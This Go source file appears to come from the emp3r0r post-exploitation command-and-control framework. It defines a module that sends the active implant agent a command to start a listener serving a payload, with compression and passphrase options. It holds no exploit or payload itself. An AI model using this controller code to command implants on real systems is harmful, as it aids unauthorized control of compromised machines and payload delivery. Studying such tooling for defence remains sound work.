package modules

import (
	"fmt"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func modListener() {
	if live.AvailableModuleOptions["listener"] == nil || live.AvailableModuleOptions["port"] == nil || live.AvailableModuleOptions["payload"] == nil || live.AvailableModuleOptions["compression"] == nil || live.AvailableModuleOptions["passphrase"] == nil {
		logging.Errorf("One or more required options are nil")
		return
	}
	cmd := fmt.Sprintf("%s --listener %s --port %s --payload %s --compression %s --passphrase %s",
		def.C2CmdListener,
		live.AvailableModuleOptions["listener"].Val,
		live.AvailableModuleOptions["port"].Val,
		live.AvailableModuleOptions["payload"].Val,
		live.AvailableModuleOptions["compression"].Val,
		live.AvailableModuleOptions["passphrase"].Val)
	err := agents.SendCmd(cmd, "", live.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
